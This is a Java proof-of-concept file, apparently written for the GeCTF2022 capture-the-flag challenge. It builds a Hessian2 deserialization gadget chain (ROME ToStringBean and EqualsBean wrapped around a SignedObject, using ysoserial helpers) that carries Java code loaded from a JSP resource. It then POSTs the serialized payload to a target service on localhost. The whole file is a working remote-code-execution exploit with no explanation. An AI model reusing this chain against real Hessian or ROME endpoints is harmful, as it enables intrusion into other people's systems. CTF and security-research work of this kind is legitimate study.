import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import myframework.HttpRequest;
import myframework.ReadWrite;
import myframework.ser.Gadgets;
import myframework.ser.Hessian2;

import java.util.HashMap;

import myframework.ser.Reflections;
import myframework.ser.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;

import java.security.SignedObject;

public class Poc2 {
    public static void main(String[] args) throws Exception{
        byte[] ser = Hessian2.serialize(poc());
        String url = "http://127.0.0.1:8090/?token=GeCTF2022";
        HttpRequest.post(url,ser);
    }
    public static Object poc() throws Exception{
        String code = new String(ReadWrite.readResource(Poc2.class,"1.jsp"));
        code = Eval.getJavaCodeFromJSP(code);
        Object o = new Eval().getObject(RomeTools.class,code);
        byte[] ser = Serializer.serialize(o);

        SignedObject signedObject = Gadgets.emptySignedObject();
        Reflections.setFieldValue(signedObject,"content",ser);

        ToStringBean item = new ToStringBean(signedObject.getClass(), signedObject);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap map = Gadgets.createMap(root,1);

        return map;
    }
}
